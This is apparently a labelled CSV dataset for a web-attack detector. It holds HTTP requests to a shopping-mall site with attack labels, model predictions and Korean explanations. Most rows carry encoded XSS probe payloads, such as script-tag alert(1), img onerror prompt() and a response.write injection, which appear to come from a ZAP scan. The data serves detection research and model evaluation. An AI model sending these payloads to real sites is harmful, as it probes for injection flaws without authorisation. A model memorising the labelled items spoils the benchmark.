Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
105516,"</option>
                <option value=""https://www.kopico.go.kr/main/main.do""></option>
                <option value=""http://www.kisa.or.kr""></option>
                <option value=""https://privacy.kisa.or.kr/main.do""></option>
                <option value=""https://intra.privacy.go.kr/uat/uia/egovLoginUsr.do""></option>
                <option value=""https://link.privacy.go.kr/nadac/index.do""></option>
                <option value=""https://kidc.eprivacy.go.kr""></option>
....<option value=""http://www.boho.or.kr/main.do"">()</option>
                <option value=""http://www.spamcop.or.kr""></option>
                <option value=""http://www.rootca.or.kr""></option>
                <option value=""https://ecrm.police.go.kr""> (ECRM)</option>
                <option value=""https://www.ncsc.go.kr:4018""> </option>
                <option value=""http://www.ecmc.or.kr"">ICT</option>
            </select>
            <a href=""javascript:void(0)"" title=""  ""></a>
        </div>

        <ul class=""oneFooterLayout_logoList"">
   ",0,Not Attack,,13,-1,False,이 코드 스니펫은 보여주기 목적을 위해 여러 웹 사이트의 링크를 포함하고 있습니다. 이는 정상적인 웹 페이지 내용으로 보입니다. 페이로드 공격이 아닌 것으로 간주됩니다.
122527,"GET /board/?category=%3C%2Fscript%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E&gdviewer=1&goods_seq=52&id=goods_review&iframe=1&page=&perpage=&popup=&score=&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=52&id=goods_review&iframe=1
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : Cross-Site Scripting (XSS)"
123324,"POST /board/?category=&gdviewer=1&goods_seq=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&id=goods_qna&iframe=1&page=&perpage=&popup=&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?category&gdviewer=1&goods_seq=69&id=goods_qna&iframe=1&page&perpage&popup&search_text=ZAP
Content-Length: 56
Cookie: shopReferer=; today_view=a%3A14%3A%7Bi%3A0%3Bi%3A39%3Bi%3A1%3Bi%3A53%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A43%3Bi%3A4%3Bi%3A56%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A77%3Bi%3A8%3Bi%3A75%3Bi%3A9%3Bi%3A67%3Bi%3A10%3Bi%3A54%3Bi%3A11%3Bi%3A51%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3B%7D; marketplace=direct

modetype=&seq=&cmtseq=&cmtparentseq=&cmtreplyidx=&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : <script>alert(1);</script>
공격 유형 : Cross-Site Scripting (XSS)"
122573,"GET /board/?category=&goods_seq=&id=goods_qna&iframe=&page=&perpage=&popup=%27%3Balert%281%29%3B%27&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/board/?id=goods_qna
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : Cross-Site Scripting (XSS)"
122443,"POST /board_process HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?id=notice
Content-Length: 68
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct

seq=&returnurl=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : Cross-Site Scripting (XSS)"
122429,"GET /app/javascript/js/base64.js?v=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop
Cookie: shopReferer=; today_view=a%3A8%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E
공격 유형 : Cross-Site Scripting (XSS)"
123207,"GET /board/?gdviewer=1&goods_seq=51&id=goods_review&iframe=%3C%2Fscript%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E%3Cscript%3E HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/goods/view?no=51
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A55%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A53%3Bi%3A3%3Bi%3A41%3Bi%3A4%3Bi%3A40%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A42%3Bi%3A8%3Bi%3A70%3Bi%3A9%3Bi%3A69%3Bi%3A10%3Bi%3A77%3Bi%3A11%3Bi%3A75%3Bi%3A12%3Bi%3A67%3Bi%3A13%3Bi%3A54%3Bi%3A14%3Bi%3A51%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : <img src=x onerror=prompt()> 
공격 유형 : Cross-Site Scripting (XSS)"
11808,"GET /data/shopimage/Crouzet%20C_O%20BEI%20Systems%20and%20Sensor%20Company/PB8SM.jpg HTTP/1.0\r\nConnection: Close\r\nReferer: http://www.intopion.com/goods/catalog?code=000100190008\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nHost: www.intopion.com\r\nUser-Agent: Mozilla/5.0 (compatible; heritrix/3.4.0-SNAPSHOT-2020-09-11T03:25:45Z +http://www.oasis.go.kr)\r\nCookie: marketplace=direct; shopReferer=; today_view=a%3A50%3A%7Bi%3A0%3Bi%3A3724968%3Bi%3A1%3Bi%3A3669247%3Bi%3A2%3Bi%3A3790665%3Bi%3A3%3Bi%3A3725256%3Bi%3A4%3Bi%3A3724120%3Bi%3A5%3Bi%3A3626078%3Bi%3A6%3Bi%3A3479327%3Bi%3A7%3Bi%3A3479921%3Bi%3A8%3Bi%3A3482188%3Bi%3A9%3Bi%3A3479137%3Bi%3A10%3Bi%3A1536333%3Bi%3A11%3Bi%3A1536322%3Bi%3A12%3Bi%3A1536286%3Bi%3A13%3Bi%3A3364417%3Bi%3A14%3Bi%3A3364406%3Bi%3A15%3Bi%3A3830822%3Bi%3A16%3Bi%3A3714162%3Bi%3A17%3Bi%3A3713820%3Bi%3A18%3Bi%3A3730249%3Bi%3A19%3Bi%3A3713674%3Bi%3A20%3Bi%3A3503690%3Bi%3A21%3Bi%3A3498948%3Bi%3A22%3Bi%3A3389593%3Bi%3A23%3Bi%3A3500389%3Bi%3A24%3Bi%3A3411538%3Bi%3A25%3Bi%3A3528403%3Bi%3A26%3Bi%3A3549085%3Bi%3A27%3Bi%3A3723257%3Bi%3A28%3Bi%3A3556759%3Bi%3A29%3Bi%3A3546376%3Bi%3A30%3Bi%3A3425073%3Bi%3A31%3Bi%3A1655487%3Bi%3A32%3Bi%3A1585929%3Bi%3A33%3Bi%3A3565803%3Bi%3A34%3Bi%3A3378762%3Bi%3A35%3Bi%3A3655277%3Bi%3A36%3Bi%3A3464025%3Bi%3A37%3Bi%3A3410690%3Bi%3A38%3Bi%3A3475426%3Bi%3A39%3Bi%3A3475398%3Bi%3A40%3Bi%3A3347007%3Bi%3A41%3Bi%3A3700973%3Bi%3A42%3Bi%3A3370466%3Bi%3A43%3Bi%3A335839",0,Not Attack,,14,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
123396,"POST /board/?category=&goods_seq=&id=goods_qna&iframe=&page=&perpage=&popup=&search_text=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?category&goods_seq&id=goods_qna&iframe&page&perpage&popup&search_text=ZAP
Content-Length: 56
Cookie: shopReferer=; today_view=a%3A14%3A%7Bi%3A0%3Bi%3A39%3Bi%3A1%3Bi%3A53%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A43%3Bi%3A4%3Bi%3A56%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A77%3Bi%3A8%3Bi%3A75%3Bi%3A9%3Bi%3A67%3Bi%3A10%3Bi%3A54%3Bi%3A11%3Bi%3A51%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3B%7D; marketplace=direct

modetype=&seq=&cmtseq=&cmtparentseq=&cmtreplyidx=&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E
공격 유형 : Cross-Site Scripting (XSS)"
123224,"GET /board/?category=&gdviewer=1&goods_seq=51&id=goods_review&iframe=1&page=&perpage=&popup=&score=&search_text=%3C%2Fscript%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=51&id=goods_review&iframe=1
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A55%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A53%3Bi%3A3%3Bi%3A41%3Bi%3A4%3Bi%3A40%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A42%3Bi%3A8%3Bi%3A70%3Bi%3A9%3Bi%3A69%3Bi%3A10%3Bi%3A77%3Bi%3A11%3Bi%3A75%3Bi%3A12%3Bi%3A67%3Bi%3A13%3Bi%3A54%3Bi%3A14%3Bi%3A51%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %3C%2Fscript%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E
공격 유형 : Cross-Site Scripting (XSS)"
123827,"GET /promotion/event?event_name=%27%3Balert%281%29%3B%27&sc_filter=sales&sc_status=ing HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/promotion/event
Cookie: shopReferer=; today_view=a%3A14%3A%7Bi%3A0%3Bi%3A39%3Bi%3A1%3Bi%3A53%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A43%3Bi%3A4%3Bi%3A56%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A77%3Bi%3A8%3Bi%3A75%3Bi%3A9%3Bi%3A67%3Bi%3A10%3Bi%3A54%3Bi%3A11%3Bi%3A51%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27%3Balert%281%29%3B%27
공격 유형 : Cross-Site Scripting (XSS)"
123154,"GET /board/?category=&gdviewer=%3C%2Fscript%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E&goods_seq=51&id=goods_qna&iframe=1&page=&perpage=&popup=&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=51&id=goods_qna&iframe=1
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A55%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A53%3Bi%3A3%3Bi%3A41%3Bi%3A4%3Bi%3A40%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A42%3Bi%3A8%3Bi%3A70%3Bi%3A9%3Bi%3A69%3Bi%3A10%3Bi%3A77%3Bi%3A11%3Bi%3A75%3Bi%3A12%3Bi%3A67%3Bi%3A13%3Bi%3A54%3Bi%3A14%3Bi%3A51%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : <script>alert(1);</script>
공격 유형 : Cross-Site Scripting (XSS)"
122331,"POST /board/?gdviewer=%22%3Balert%281%29%3B%22&goods_seq=52&id=goods_review&iframe=1 HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=52&id=goods_review&iframe=1
Content-Length: 56
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct

modetype=&seq=&cmtseq=&cmtparentseq=&cmtreplyidx=&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : gdviewer=%22%3Balert%281%29%3B%22
공격 유형 : Cross-Site Scripting (XSS)"
122317,"POST /board/?category=%22%3Balert%281%29%3B%22&goods_seq=&id=bulkorder&iframe=&page=&perpage=&popup=&score=&search_text=ZAP HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?category&goods_seq&id=bulkorder&iframe&page&perpage&popup&score&search_text=ZAP
Content-Length: 56
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct

modetype=&seq=&cmtseq=&cmtparentseq=&cmtreplyidx=&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%3Balert%281%29%3B%22
공격 유형 : Cross-Site Scripting (XSS)"
123927,"GET /goods/new_arrivals?event=&filter_display=lattice&gift=&osearchtext=&page=1&per=40&searchMode=new_arrivals&ship_grp_seq=&sorting=regist&sorting-brand=%22%2Bresponse.write%28%5B403%2C351*526%2C246%29%2B%22 HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Referer: http://www.mall.shop/goods/new_arrivals
Cookie: shopReferer=; today_view=a%3A7%3A%7Bi%3A0%3Bi%3A39%3Bi%3A1%3Bi%3A53%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A43%3Bi%3A4%3Bi%3A56%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3B%7D; marketplace=direct
Content-Length: 0",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ""+response.write([403,351*526,246)+"" 
공격 유형 : Cross-Site Scripting (XSS)"
122904,"POST /board/?category=&goods_seq=&id=goods_review&iframe=&page=&perpage=&popup=&score=&search_text=%27%3Balert%281%29%3B%27 HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: http://www.mall.shop/board/?category&goods_seq&id=goods_review&iframe&page&perpage&popup&score&search_text=ZAP
Content-Length: 56
Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A55%3Bi%3A1%3Bi%3A39%3Bi%3A2%3Bi%3A53%3Bi%3A3%3Bi%3A41%3Bi%3A4%3Bi%3A40%3Bi%3A5%3Bi%3A48%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A42%3Bi%3A8%3Bi%3A70%3Bi%3A9%3Bi%3A69%3Bi%3A10%3Bi%3A77%3Bi%3A11%3Bi%3A75%3Bi%3A12%3Bi%3A67%3Bi%3A13%3Bi%3A54%3Bi%3A14%3Bi%3A51%3B%7D; marketplace=direct

modetype=&seq=&cmtseq=&cmtparentseq=&cmtreplyidx=&pw=ZAP",1,XSS,,14,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : Cross-Site Scripting (XSS)"
